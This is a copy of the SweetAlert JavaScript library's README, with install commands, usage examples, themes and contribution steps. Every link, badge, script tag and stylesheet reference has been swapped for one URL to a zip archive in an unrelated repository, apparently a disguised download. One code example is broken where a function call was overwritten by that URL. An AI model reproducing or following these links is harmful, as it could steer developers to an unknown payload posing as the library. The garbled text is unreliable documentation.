SweetAlert [![Build Status](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
==========

An awesome replacement for JavaScript's alert.

![A success modal](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)

[See it in action!](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)

[Learn how to use it!](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)


Usage
-----

You can install SweetAlert through bower:

```bash
bower install sweetalert
```

Or through npm:

```bash
npm install sweetalert
```

Alternatively, download the package and reference the JavaScript and CSS files manually:

```html
<script src="https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip"></script>
<link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip">
```
**Note:** If you're using an older version than v1.0.0, the files are `https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip` and `https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip`


Tutorial
--------

The easiest way to get started is follow the [SweetAlert tutorial on Ludu](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)!


Examples
--------

The most basic message:

```javascript
swal("Hello world!");
```

A message signaling an error:

```javascript
swal("Oops...", "Something went wrong!", "error");
```

A warning message, with a function attached to the "Confirm"-button:

```javascript
swal({
  title: "Are you sure?",
  text: "You will not be able to recover this imaginary file!",
  type: "warning",
  showCancelButton: true,
  confirmButtonColor: "#DD6B55",
  confirmButtonText: "Yes, delete it!",
  closeOnConfirm: false,
  html: false
}, function(){
  swal("Deleted!",
  "Your imaginary file has been deleted.",
  "success");
});
```

A prompt modal where the user's input is logged:

```javascript
swal({
  title: "An input!",
  text: 'Write something interesting:',
  type: 'input',
  showCancelButton: true,
  closeOnConfirm: false,
  animation: "slide-from-top"
}, function(inputValue){
  https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip("You wrote", inputValue);
});
```

Ajax request example:

```javascript
swal({
  title: 'Ajax request example',
  text: 'Submit to run ajax request',
  type: 'info',
  showCancelButton: true,
  closeOnConfirm: false,
  disableButtonsOnConfirm: true,
  confirmLoadingButtonColor: '#DD6B55'
}, function(inputValue){
  setTimeout(function() {
    swal('Ajax request finished!');
  }, 2000);
});
```

[View more examples](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)


Themes
------

SweetAlert can easily be themed to fit your site's design. SweetAlert comes with three example themes that you can try out: **facebook**, **twitter** and **google**. They can be referenced right after the intial sweetalert-CSS:
```html
<link rel="stylesheet" href="https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip">
<link rel="stylesheet" href="https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip">
```


Browser compatibility
---------------------

SweetAlert works in most major browsers (yes, even IE). Some details:

- **IE8**: (Dropped since v1.0.0-beta)
- **IE9**: Works, but icons are not animated.
- **IE10+**: Works!
- **Safari 4+**: Works!
- **Firefox 3+**: Works!
- **Chrome 14+**: Works!
- **Opera 15+**: Works!


Contributing
------------

If you want to contribute:

- Fork the repo

- Make sure you have [Node](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip), [NPM](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip) and [Gulp](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip) installed. When in the SweetAlert directory, run `npm install` to install the dependencies. Then run `gulp` while working to automatically minify the SCSS and JS-files.

- Keep in mind that SweetAlert uses Browserify in order to compile ES6-files. For easy debugging, make sure you reference the file `https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip` instead of `https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip`.

- After you're done, make a pull request and wait for approval! :)


Related projects
----------------

* [SweetAlert for Android](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
* [SweetAlert for Bootstrap](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
* [SweetAlert for AngularJS](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
* [SweetAlert for RubyOnRails](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
